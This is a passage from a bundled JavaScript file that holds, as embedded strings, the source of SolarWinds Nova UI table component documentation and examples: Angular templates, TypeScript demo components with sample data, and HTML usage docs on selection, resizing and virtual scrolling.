</td>\n        </ng-container>\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},26875:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="td.overflow-visible {\n    overflow: visible;\n    text-align: center;\n}\n"},5751:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    ChangeDetectionStrategy,\n    Component,\n    Inject,\n    OnInit,\n    TemplateRef,\n    ViewChild,\n} from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport { DialogService, TableComponent } from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    issue: string;\n    project: string;\n    description: string;\n    status: string;\n    epic: string;\n    assignee: string;\n    reporter: string;\n    actions: any;\n}\n\n@Component({\n    selector: "nui-table-columns-add-remove-example",\n    templateUrl: "./table-columns-add-remove.example.component.html",\n    styleUrls: ["table-columns-add-remove.example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableColumnsAddRemoveExampleComponent {\n    public availableColumns = [\n        "issue",\n        "project",\n        "description",\n        "status",\n        "epic",\n        "assignee",\n        "reporter",\n        "actions",\n    ];\n    public displayedColumns = [\n        "issue",\n        "project",\n        "description",\n        "status",\n        "epic",\n        "actions",\n    ];\n    // full copy of displayed columns added to update columns only when updateTable() is called\n    public displayedColumnsCopy = this.displayedColumns.slice();\n    public myForm;\n    public newColumn: string;\n    public dataSource = getData();\n    @ViewChild(TableComponent) table: TableComponent<IExampleTableModel>;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        private formBuilder: FormBuilder\n    ) {\n        this.myForm = this.formBuilder.group({\n            checkboxGroup: this.formBuilder.control(this.displayedColumnsCopy, [\n                Validators.required,\n                Validators.minLength(3),\n            ]),\n        });\n    }\n\n    public columnsChanged(columns: any): void {\n        this.displayedColumnsCopy = columns;\n    }\n\n    public isChecked(vegetable: string): boolean {\n        return this.displayedColumnsCopy.indexOf(vegetable) > -1;\n    }\n\n    public open(content: TemplateRef<string>): void {\n        this.dialogService.open(content, { size: "sm" });\n    }\n\n    public updateNewColumnValue(event: any): void {\n        this.newColumn = event;\n    }\n\n    public addNewColumn(): void {\n        if (this.newColumn) {\n            this.availableColumns.push(this.newColumn);\n            this.displayedColumnsCopy.push(this.newColumn);\n            this.newColumn = "";\n        }\n    }\n\n    public updateColumns(): void {\n        this.displayedColumns = this.displayedColumnsCopy.slice();\n    }\n\n    public columnIsActions(column: string): boolean {\n        return column === "actions";\n    }\n\n    public deleteRow(row: IExampleTableModel): void {\n        this.dataSource.splice(this.dataSource.indexOf(row, 0), 1);\n        this.table.renderRows();\n    }\n\n    public appendRow(): void {\n        this.dataSource.splice(this.dataSource.length, 0, getRowDataToAppend());\n        this.table.renderRows();\n    }\n\n    public prependRow(): void {\n        this.dataSource.splice(0, 0, getRowDataToPrepend());\n        this.table.renderRows();\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            issue: "NUI-111",\n            project: "Nova NUI",\n            description:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.",\n            status: "In Progress",\n            epic: "Table Component",\n            assignee: "Alex",\n            reporter: "Maria",\n            actions: "Some custom date here",\n        },\n        {\n            issue: "NUI-222",\n            project: "Nova NUI",\n            description: "Sed ut perspiciatis unde omnis iste natus error sit.",\n            status: "In Progress",\n            epic: "Table Component",\n            assignee: "Maria",\n            reporter: "Peter",\n            actions: "Some custom date here",\n        },\n        {\n            issue: "NUI-333",\n            project: "Nova NUI",\n            description:\n                "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.",\n            status: "In Progress",\n            epic: "Table Component",\n            assignee: "John",\n            reporter: "Rob",\n            actions: "Some custom date here",\n        },\n        {\n            issue: "NUI-444",\n            project: "Nova NUI",\n            description:\n                "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.",\n            status: "Done",\n            epic: "Textbox Component",\n            assignee: "Alberto",\n            reporter: "Emma",\n            actions: "Some custom date here",\n        },\n        {\n            issue: "NUI-555",\n            project: "Nova NUI",\n            description:\n                "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",\n            status: "Open",\n            epic: "Textbox Component",\n            assignee: "Rob",\n            reporter: "Emma",\n            actions: "Some custom date here",\n        },\n    ];\n}\n\nfunction getRowDataToPrepend(): IExampleTableModel {\n    return {\n        issue: "NUI-100",\n        project: "Nova NUI",\n        description: "This row is added to the beginning",\n        status: "New status",\n        epic: "Radio Component",\n        assignee: "Maria",\n        reporter: "Rob",\n        actions: "Some custom date here",\n    };\n}\n\nfunction getRowDataToAppend(): IExampleTableModel {\n    return {\n        issue: "NUI-1100",\n        project: "Nova NUI",\n        description: "This row is added",\n        status: "New status",\n        epic: "Radio Component",\n        assignee: "Maria",\n        reporter: "Rob",\n        actions: "Some custom date here",\n    };\n}\n'},81578:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<style>\n    .markers ul li {\n        list-style-type: circle;\n        text-indent: 30px;\n    }\n</style>\n\n<p>\n    A Data Table is used for presenting data in a logical table-layout\n    structure, and <code>&lt;nui-table&gt;</code> is the Nova component that\n    provides this functionality.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiTableModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<ul>\n    <li>\n        1. Define columns to display\n        <p>\n            A column definition is specified via an\n            <code>ng-container</code> with the\n            <code>nuiColumnDef</code> attribute, giving each column a name. Each\n            column definition can contain a header-cell template with an\n            <code>*nuiHeaderCellDef</code> attribute, a data-cell template with\n            an <code>*nuiCellDef</code> attribute, and a footer-cell template\n            with an <code>*nuiFooterCellDef</code> attribute.\n        </p>\n    </li>\n    <li>\n        2. Define the table\'s header-row and data-row\n        <p>\n            This can be done via the <code>*nuiHeaderRowDef</code> and\n            <code>*nuiRowDef</code> attributes respectively.\n        </p>\n    </li>\n    <li>\n        3. Initialize the <code>*nuiHeaderRowRef</code> attribute with the list\n        of column names\n        <p>\n            This one should be in sync with the column templates (i.e. four\n            <code>nuiColumnDef</code> directives for four items in the columns\n            array.\n        </p>\n    </li>\n    <li>\n        4. Assign some data to the <code>dataSource</code> input\n        <p>\n            When this one changes, the table will re-render. Note: Table\n            re-rendering will only occur when the actual reference of\n            <code>dataSource</code> changes.\n        </p>\n    </li>\n</ul>\n<p>\n    To make a table scroll horizontally, wrap it in a container with the class\n    <code>nui-table__container</code> or add this class to your existing\n    wrapper. Without this class, a table that exceeds the width of its container\n    will overlap the right edge of the container.\n</p>\n<nui-example-wrapper filenamePrefix="table-basic" exampleTitle="Basic Usage">\n    <nui-table-basic-example></nui-table-basic-example>\n</nui-example-wrapper>\n\n<h2>Pinned Header</h2>\n<p>\n    To make the header sticky, set the <code>sticky</code> input to true on the\n    <code>*nuiHeaderRowDef</code> directive.\n</p>\n<nui-example-wrapper\n    filenamePrefix="table-pinned-header"\n    exampleTitle="Pinned header"\n>\n    <nui-table-pinned-header-example></nui-table-pinned-header-example>\n</nui-example-wrapper>\n\n<h2>Cell Content Alignment</h2>\n<p>\n    By default, cell content in the form of text is aligned to the left, and\n    numbers are aligned to the right (alignment for a cell is determined by its\n    corresponding datasource item). All alignments can be set via the\n    <code>alignment</code> input of an <code>nui-cell</code> or\n    <code>nui-header-cell</code> directive. Valid options are: <b>left</b>,\n    <b>right</b>, or <b>center</b>.\n</p>\n<p>\n    If you want custom positioning and alignment inside table cells, just wrap\n    everything inside your cell in the container and apply styles just as you\n    need them:\n</p>\n<nui-example-code language="html">\n    {{ alignmentCode }}\n</nui-example-code>\n<p>\n    Or, you can apply some styling to the whole <code>td</code> by putting your\n    class there:\n    <code\n        >&lt;td nui-cell *nuiCellDef="let element"\n        class="custom-class"&gt;&lt;/td&gt;</code\n    >\n</p>\n<p>\n    For example, column "Location" is vertically aligned to the top, and column\n    "Outages" is vertically aligned to the bottom.\n</p>\n<p>\n    <b>Note:</b> Input <code>type="icon"</code> on the\n    <code>nuiColumnDef</code> directive will set width of that column\'s cells to\n    40px and center the cell content both vertically and horizontally.\n</p>\n<nui-example-wrapper\n    filenamePrefix="table-cell-content-align"\n    exampleTitle="Column Alignment"\n>\n    <nui-table-cell-content-align-example></nui-table-cell-content-align-example>\n</nui-example-wrapper>\n\n<h2>Column Width and Tooltips</h2>\n<p>\n    To change width of a column, use Angular binding syntax to set the pixel\n    value of <code>[style.width.px]</code> on the\n    <code>&lt;th&gt;</code> element of the column.\n</p>\n<p>\n    To add a tooltip to a cell, set the <code>[tooltipText]</code> input on the\n    <code>nuiHeaderCellDef</code> or <code>nuiCellDef</code> directive.\n</p>\n<h3>Default widths:</h3>\n<ul>\n    <li><b>Table</b> <code>width</code> is <b>100%</b>.</li>\n    <li><b>Column</b> <code>min-width</code> is <b>46px</b>.</li>\n</ul>\n<nui-example-wrapper\n    filenamePrefix="table-cell-width-set"\n    exampleTitle="Column Width and Tooltips"\n>\n    <nui-table-cell-width-set></nui-table-cell-width-set>\n</nui-example-wrapper>\n\n<h2>Row Density</h2>\n<p>\n    Row height can be specified via the <code>density</code> input of\n    <code>nui-row</code>. Valid options are: <b>default</b> - 40px,\n    <b>compact</b> - 30px, or <b>tiny</b> - 24px.\n    <code>density = "tiny"</code> is used in the example below. The same for\n    header height.\n</p>\n<nui-example-wrapper\n    filenamePrefix="table-row-height-set"\n    exampleTitle="Row Density"\n>\n    <nui-table-row-height-set></nui-table-row-height-set>\n</nui-example-wrapper>\n\n<h2>Column Reordering</h2>\n<p>\n    To make a table reorderable, <code>[reorderable]="true"</code> should be\n    specified on the <code>&lt;nui-table&gt;</code> element. Bind to the\n    reordering event using the <code>(columnsOrderChange)</code> output.\n</p>\n<nui-example-wrapper\n    filenamePrefix="table-reorder"\n    exampleTitle="Column reordering"\n>\n    <nui-table-reorder-example></nui-table-reorder-example>\n</nui-example-wrapper>\n\n<h2>Custom Actions</h2>\n<p>\n    Table supports custom user actions. To add or remove table columns, update\n    the list of column names you are passing to the\n    <code>nuiHeaderRowDef</code> and <code>nuiRowDef</code> directives. The\n    template for added columns should be provided, and, if a column is removed,\n    the corresponding column template should also be removed.\n</p>\n<p>To add or remove table rows you need to:</p>\n<ol>\n    <li>Add <code>@ViewChild</code> in your component.</li>\n    <li>Modify your <code>dataSource.</code></li>\n    <li>\n        After modifying your data (adding or removing rows) you will need to\n        call <code>renderRows</code> method on your table using\n        <code>@ViewChild</code> variable.\n    </li>\n</ol>\n<p>\n    <b>Note 1:</b> If you want to use <code>nui-menu</code> or other components\n    with dropdowns you will need to add class to <code>td</code> in your\n    template where you will need to set <code>overflow:visible</code>.\n</p>\n<p>\n    <b>Note 2:</b> Class <code>nui-edge-definer</code> is added to table\n    container in this example not to make menu open down in the last row and\n    cause scroll because of <code>overflow:auto</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="table-columns-add-remove"\n    exampleTitle="Custom actions"\n>\n    <nui-table-columns-add-remove-example></nui-table-columns-add-remove-example>\n</nui-example-wrapper>\n\n<h2>Column Resize</h2>\n<p>\n    To enable the resizing of a table you need to set\n    <code>[resizable]="true"</code>. When a table is resizable, it\'s layout is\n    set to <code>table-layout: fixed</code>; therefore, column widths will not\n    be recalculated automatically as they are with the default table-layout. You\n    can provide the desired width of a column in <code>px</code> on the\n    <code>columnDef</code> directive. The rest of the table width will be\n    distributed among the other columns equally.\n</p>\n<nui-example-wrapper filenamePrefix="table-resize" exampleTitle="Column resize">\n    <nui-table-resize-example></nui-table-resize-example>\n</nui-example-wrapper>\n\n<h2>Using trackBy</h2>\n<p>\n    To improve performance, you can let Angular know which row elements in the\n    table can be reused during a change detection cycle by binding a trackBy\n    handler to <code>nui-table</code>\'s\n    <code\n        ><a\n            href="https://material.angular.io/cdk/table/overview#connecting-the-table-to-a-data-source"\n            target="_blank"\n            >trackBy</a\n        ></code\n    >\n    property inherited from\n    <code\n        ><a\n            href="https://material.angular.io/cdk/table/overview"\n            target="_blank"\n            >CdkTable</a\n        ></code\n    >. The trackBy handler should return a value that uniquely identifies each\n    item in the table.\n</p>\n<p>\n    Besides performance, another benefit of using trackBy is that the table can\n    keep track of selections based on the identifier returned by the trackBy\n    handler. This is necessary if table items are transmitted across the wire\n    during user interaction. See <strong>Enabling Row Selection</strong>\n    below for usage.\n</p>\n\n<h2>Enabling Row Selection</h2>\n<p>To be able to select rows, do the following:</p>\n<nui-table-row-selection-instructions></nui-table-row-selection-instructions>\n<p>\n    <b>Note 1:</b>To preselect rows in table and programmatically change\n    selection you can use <code>[selection]</code> input which has\n    <code\n        ><a href="../interfaces/ISelection.html" target="_blank"\n            >ISelection</a\n        ></code\n    >\n    type.\n</p>\n<p>\n    <b>Note 2:</b> If you need to use <code>paginator</code> with row selection,\n    you need to pass count of all items on all pages into\n    <code>totalItems</code> input.\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    <p>\n        <strong>Important:</strong> When working with data that\'s coming across\n        the wire, it\'s necessary to bind a trackBy handler as mentioned above.\n        This will allow selection tracking to be based on the identifier\n        returned by the trackBy handler. If a trackBy is not provided,\n        comparisons to determine whether items are selected will be based on\n        object reference which of course won\'t work with items coming from a\n        backend.\n    </p>\n    Take a look at the source of the following example to see how.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="table-select"\n    exampleTitle="Enabling Row Selection"\n>\n    <nui-table-select></nui-table-select>\n</nui-example-wrapper>\n<h3>Clickable Table Row</h3>\n<p>\n    This option allows for making the whole row clickable for selecting or\n    deselecting it instead of having the checkbox as the only selectable area.\n    It should be combined with the\n    <code>selectionConfig.enabled = true</code> input of the corresponding\n    <code>TableComponent</code>. When a table has no selectable rows configured,\n    it\'s obviously not possible to enable row selection/deselection by clicking\n    on any area of the row.\n</p>\n<p>\n    In a very basic configuration, when the table has\n    <code>selectionConfig.enabled = true</code> configured, adding\n    <code>clickableRow = true</code> input to the <code>TR</code> element\n    introduces a behavior in which any click inside the row selects or deselects\n    it.\n</p>\n<p>\n    Sometimes it isn\'t desirable to select/deselect a row when certain elements\n    within the row are clicked as they serve other purposes - e.g. when a button\n    is located inside a row, a user would expect some action to be triggered on\n    the button click, rather than selection of the row. So it\'s possible to\n    configure the row click behavior to ignore clicks on some predefined\n    elements. Such elements can be configured by providing their CSS selectors\n    in the <code>ignoredSelectors</code> property of the\n    <code>clickableRowConfig</code> input. The default value for this property\n    is <code>["button", "input[type=\'button\']", "a[href]"]</code>. It\'s also\n    possible to explicitly configure elements to trigger row\n    selection/deselection on click. This can be done by providing their CSS\n    selectors in the <code>clickableSelectors</code> property of the\n    <code>clickableRowConfig</code> input. It\'s default value is\n    <code>["nui-row", "tr[nui-row]"]</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="table-row-clickable"\n    exampleTitle="Clickable Table Row"\n>\n    <nui-table-row-clickable></nui-table-row-clickable>\n</nui-example-wrapper>\n\n<h2>Infinite Scrolling Without Custom Strategy</h2>\n<nui-message [allowDismiss]="false" type="warning">\n    Please consult your UX team before using the example below.\n</nui-message>\n<p>\n    In case one doesn\'t want to create a custom virtual scroll strategy to\n    implement scrolling for the <code>nui-table</code> there is a solution that\n    does not use viewport indexes, and involves background data fetching. User\n    is required to set a <code>step</code> and <code>itemsToLoad</code> fields\n    to configure how many items they want to load per user action, and the step\n    size. <br /><br />\n\n    For example, if user wants 500 items loaded per user action, it may be heavy\n    to load so many items at once. Setting the <code>step</code> field sets the\n    amount of data loaded on the background to smoothen user experience, and let\n    user scroll through the loaded chunks instead of waiting for the entire\n    dataset to get loaded. This means if we want 500 items loaded and set the\n    step to 100, there will be total 5 API calls to fetch 100 items each. This\n    allows the user to get chunks of data in the background and get them loaded\n    into the table as they scroll through the results.\n</p>\n\nConsider the following in the example:\n<ol>\n    <li>\n        <code>step</code> - sets the step (how many items are loaded per fetch\n        on the background). Pay attention, there is logic that handles the\n        leftover, which means if there are 500 items to load and we set the\n        <code>step</code> to 200, there will be total 3 API calls fetching 200,\n        200, and the leftover of 100 items.\n    </li>\n    <li>\n        <code>itemsToLoad</code> - total amount of data to load per user action.\n    </li>\n    <li>\n        Optional <code>sticky footer</code>. When inside the sdk virtual scrolll\n        viewport, the footer will scroll with the rest of the items. When\n        sticky, it stays visible all the time.\n    </li>\n    <li>\n        <code>Load next X items</code> button in footer. This allows to fetch an\n        additional chunk of data on demand, which may be more desirable in some\n        cases.\n    </li>\n</ol>\n\n<nui-example-wrapper\n    filenamePrefix="table-virtual-scroll-steps-and-button"\n    exampleTitle="Scrolling with Step Fetching and Optional Data Load"\n>\n    <nui-table-virtual-scroll-steps-and-button-example></nui-table-virtual-scroll-steps-and-button-example>\n</nui-example-wrapper>\n\n<h3>Virtual Scroll with Sticky Header</h3>\n<p>\n    To be able to use Nova Table with CDK Virtual Scroll we provide a special\n    directive\n    <code>tableStickyHeader</code> which will detach table head from scrollable\n    viewport and will simulate the sticky/fixed position.\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    Bind <strong>only visible rows</strong> to the table\'s\n    <strong>dataSource</strong> and use <strong>cdkVirtualFor</strong> to render\n    the rows.\n</nui-message>\n<nui-message [allowDismiss]="false" type="info">\n    <code>tableStickyHeader</code> directive supports runtime state switch by\n    just binding a boolean value to it\n    <code>[tableStickyHeader]="false"</code> or taking the\n    <code>TableStickyHeaderDirective</code> reference via\n    <code>ViewChild</code> decorator and updating the\n    <code>tableStickyHeader</code> property.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="table-virtual-scroll-sticky-header"\n    exampleTitle="Virtual Scroll with Sticky Header"\n>\n    <nui-table-virtual-scroll-sticky-header-example></nui-table-virtual-scroll-sticky-header-example>\n</nui-example-wrapper>\n\n<h3>Virtual Scroll with Sticky Header and Row Selection</h3>\n<p>\n    To implement selection on a table with virtual scroll you can start with the\n    <strong>Virtual Scroll with Sticky Header</strong> example and then follow\n    the <strong>Enabling Row Selection</strong> steps:\n</p>\n<nui-table-row-selection-instructions></nui-table-row-selection-instructions>\n<nui-example-wrapper\n    filenamePrefix="table-virtual-scroll-select-sticky-header"\n    exampleTitle="Virtual Scroll with Sticky Header and Select"\n>\n    <nui-table-virtual-scroll-select-sticky-header-example></nui-table-virtual-scroll-select-sticky-header-example>\n</nui-example-wrapper>\n\n<nui-message [allowDismiss]="false" type="info">\n    Pagination, Virtual Scroll aren\'t natively part of the\n    <code>nui-table</code> component but the\n    <a href="../additional-documentation/schematics/table.html" target="_parent"\n        >Table Schematic documentation</a\n    >\n    provides examples on how to use them; For sorting and search the same\n    schematic can be used to generate automatically the code.\n</nui-message>\n'},42921:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-table-docs-example",\n    templateUrl: "./table-docs.example.component.html",\n})\nexport class TableDocsComponent {\n    public alignmentCode = `<td nui-cell *nuiCellDef="let element">\n     <div class="custom-class">\n         {{element.status}}\n     </div>\n </td>`;\n    public fetch = `fetchURI = "\\${this.url\\}/?page=\\${end / (end - start)}&results=\\${end - start}"`;\n\n    public dataSourceSetup = {\n        extendDS: `@Injectable()\nexport class RandomuserTableDataSource extends DataSourceService<ITableModel> {\n    constructor(private searchService: SearchService) {\n        super();\n    }\n}`,\n        defineFields: `private readonly url = "https://yourserver.com/api";\nprivate cache = Array.from<ITableModel>({ length: 0 });\npublic busy = new BehaviorSubject(false);`,\n        getData: `public async getData(start: number = 0, end: number= 20): Promise<INovaFilteringOutputs> {\n    let response: IRandomuserResponse = null;\n    try {\n        response = await\n                    (await fetch("this.fetchURI"))\n                        .json();\n                            return {\n                                users: response.results.map((result: IRandomuserResults, i: number) => ({\n                                    no: this.cache.length + i + 1,\n                                    nameTitle: result.name.title,\n                                    nameFirst: result.name.first,\n                                    nameLast: result.name.last,\n                                    gender: result.gender,\n                                    country: result.location.country,\n                                    city: result.location.city,\n                                    postcode: result.location.postcode,\n                                    email: result.email,\n                                    cell: result.cell,\n                                })),\n                                total: response.results.length,\n                                start: start,\n                            } as UsersQueryResponse;\n    } catch (e) {\n        console.error("Error responding from server. Please visit https://https://randomuser.me/ to see if it\'s available");\n    }\n}`,\n        getFilteredData: `public async getFilteredData(filters: INovaFilters): Promise<INovaFilteringOutputs> {\n    this.busy.next(true);\n    const virtualScrollFilter = filters.virtualScroll && filters.virtualScroll.value;\n    const start = virtualScrollFilter ? filters.virtualScroll.value.start : 0;\n    const end = virtualScrollFilter ? filters.virtualScroll.value.end : 0;\n\n    this.getData(start, end).then((response: UsersQueryResponse) => {\n        if (!response) { return; }\n\n        this.cache = this.cache.concat(response.users);\n        this.dataSubject.next(this.cache);\n        this.busy.next(false);\n    });\n\n    return {\n        repeat: {\n            itemsSource: this.cache,\n        },\n        totalItems: 200,\n    }\n}`,\n    };\n\n    public tableScrollingSetup = {\n        vars: `\nprivate _totalItems: number = 0;\nprivate _isBusy: boolean = false;\n\nprivate range: number = 40;\nprivate onDestroy$: Subject<void> = new Subject<void>();\n\nget totalItems() { return this._totalItems; }\nget isBusy() { return this._isBusy; }\n\npublic users: IRandomuserTableModel[] = [];\npublic displayedColumns: string[] = ["no", "nameTitle", "nameFirst", "nameLast", "gender", "country", "city", "postcode", "email", "cell"];\nprivate dataSource: RandomuserTableDataSource;\n`,\n        viewportManagerImport: `import { VirtualViewportManager } from "@nova-ui/bits";`,\n        viewChildren: `\n@ViewChild(CdkVirtualScrollViewport, { static: false }) viewport: CdkVirtualScrollViewport;\n`,\n        provideViewport: `\n@Component({\n    //\n    providers: [VirtualViewportManager]\n})\n`,\n        injectViewport: `\nconstructor(private viewportManager: VirtualViewportManager) {}\n`,\n        oninitSubscribeBusy: `\npublic ngOnInit(): void {\n    this.dataSource.busy.subscribe(busy => {\n        this._isBusy = busy;\n    });\n}`,\n        registerScroll: `private registerVirtualScroll() {\n    this.dataSource.registerComponent({\n        virtualScroll: { componentInstance: this.viewportManager },\n    });\n }`,\n        ngAfterViewInitStart: `ngAfterViewInit(): void {\n    this.registerVirtualScroll();\n}`,\n        ngAfterViewInitViewport: `this.viewportManager\n    // Note: Initializing viewportManager with the repeat\'s CDK Viewport Ref\n    .setViewport(this.viewport)\n    // Note: Initializing the stream with the desired page size, based on which\n    // VirtualViewportManager will perform the observations and will emit\n    // distinct ranges with step equal to provided pageSize\n    .observeNextPage$({pageSize: this.range}).pipe(\n    // Note: In case we know the total number of items we can stop the stream when dataset end is reached\n    // Otherwise we can let VirtualViewportManager to stop when last received page range will not match requested range\n    filter(range => this.totalItems ? this.totalItems >= range.end : true),\n    tap(() => this.dataSource.applyFilters()),\n    // Note: Using the same stream to subscribe to the outputsSubject and update the items list\n    switchMap(() => this.dataSource.outputsSubject.pipe(\n        tap((outputs: IFilteringOutputs) => {\n            this._totalItems = outputs.totalItems;\n            this.users = outputs.repeat.itemsSource || [];\n            this.cd.detectChanges();\n        })\n    )),\n    takeUntil(this.onDestroy$)\n).subscribe();\n        `,\n    };\n}\n\n@Component({\n    selector: "nui-table-row-selection-instructions",\n    template: `\n        <ol>\n            <li>\n                Specify <code>selectionConfig</code> input, with\n                <code>enabled = true</code> and\n                <code>selectionMode !== TableSelectionMode.None</code>.\n                <br />\n                <strong>Deprecated: </strong>Specify\n                <code>selectable = true</code> input. This approach will behave\n                as if <code>selectionMode</code> was set to\n                <code>TableSelectionMode.Multi</code>.\n            </li>\n            <li>\n                Bind a trackBy handler to the\n                <code\n                    ><a\n                        href="https://material.angular.io/cdk/table/overview#connecting-the-table-to-a-data-source"\n                        target="_blank"\n                        >trackBy</a\n                    ></code\n                >\n                property inherited from\n                <code\n                    ><a\n                        href="https://material.angular.io/cdk/table/overview"\n                        target="_blank"\n                        >CdkTable</a\n                    ></code\n                >. The trackBy handler should return a value that uniquely\n                identifies each item in the table.\n                <br />\n                <strong>Note:</strong> When <code>trackBy</code> is used, the\n                <code\n                    ><a href="../interfaces/ISelection.html" target="_blank"\n                        >ISelection</a\n                    ></code\n                >\n                will consist of the trackBy property values only and will not\n                contain entire representations of the selected objects. As a\n                result, it may be beneficial to keep a separate index mapping\n                the selected item IDs to the corresponding objects.\n            </li>\n            <li>\n                Pass the row object to <code>nui-row</code> using the\n                <code>rowObject</code> input.\n            </li>\n            <li>\n                Bind to the selection event using the\n                <code>(selectionChange)</code> output. In this event table will\n                emit\n                <code\n                    ><a href="../interfaces/ISelection.html" target="_blank"\n                        >ISelection</a\n                    ></code\n                >\n                object which should be converted to selected items by calling\n                <code>getSelectedItems()</code>\n                function from\n                <code\n                    ><a\n                        href="../injectables/SelectorService.html"\n                        target="_blank"\n                        >SelectorService</a\n                    ></code\n                >.\n            </li>\n        </ol>\n    `,\n})\nexport class TableRowSelectInstructionsComponent {}\n'},56087:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-pagination-table">\n    <table nui-table [dataSource]="dataSource">\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <nui-icon\n                    *ngFor="let icon of element.features"\n                    [icon]="icon"\n                    class="icon-margin"\n                ></nui-icon>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.status }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <ng-container *ngFor="let check of element.checks">\n                    <nui-icon [icon]="check.icon"></nui-icon>\n                    {{ check.num }}\n                </ng-container>\n            </td>\n        </ng-container>\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n<nui-paginator\n    id="nui-demo-pagination-table-paginator"\n    [page]="1"\n    [pageSize]="10"\n    [total]="paginationTotal"\n    activeClass="active"\n    disabledClass="disabled"\n    showPrevNext="true"\n    (pagerAction)="changePagination()"\n    #filteringPaginator\n>\n</nui-paginator>\n'},15759:(o,n,e)=>{"use 